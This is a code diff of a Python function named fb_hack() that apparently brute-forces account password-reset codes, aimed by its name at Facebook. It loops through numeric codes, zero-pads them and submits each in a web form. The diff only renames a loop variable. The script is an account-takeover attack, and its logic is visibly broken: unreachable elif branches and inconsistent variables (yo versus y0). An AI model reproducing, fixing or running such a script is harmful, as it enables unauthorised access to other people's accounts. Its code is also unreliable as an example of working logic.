@@ -123,19 +123,19 @@ def fb_hack():
     while check1 != test or reset > 99999:  
       browser.select_form(nr=0)
       y = reset
-      if reset1 < 100000:
+      if reset < 100000:
         h = ""
         code = ("0", str(y))
         yo = h.join(code)
-      elif reset1 < 10000:
+      elif reset < 10000:
         h = ""
         code = ("0000", str(y))
         y0 = h.join(code)
-      elif reset1 < 1000:
+      elif reset < 1000:
         h = ""
         code = ("00000", str(y))
         y0 = h.join(code)
-      elif reset1 < 100:
+      elif reset < 100:
         h = ""
         code = ("000000", str(y))
         y0 = h.join(code)
@@ -167,27 +167,27 @@ def fb_hack():
     while check2 != test or reset > 9999999:
       browser.select_form(nr=0)
       y = reset
-      if reset1 < 10000000:
+      if reset < 10000000:
         h = ""
         code = ("0", str(y))
         yo = h.join(code)
-      elif reset1 < 1000000:
+      elif reset < 1000000:
         h = ""
         code = ("00", str(y))
         yo = h.join(code)
-      elif reset1 < 100000:
+      elif reset < 100000:
         h = ""
         code = ("000", str(y))
         y0 = h.join(code)
-      elif reset1 < 10000:
+      elif reset < 10000:
         h = ""
         code = ("0000", str(y))
         y0 = h.join(code)
-      elif reset1 < 1000:
+      elif reset < 1000:
         h = ""
         code = ("00000", str(y))
         y0 = h.join(code)
-      elif reset1 < 100:
+      elif reset < 100:
         h = ""
         code = ("000000", str(y))
         y0 = h.join(code)
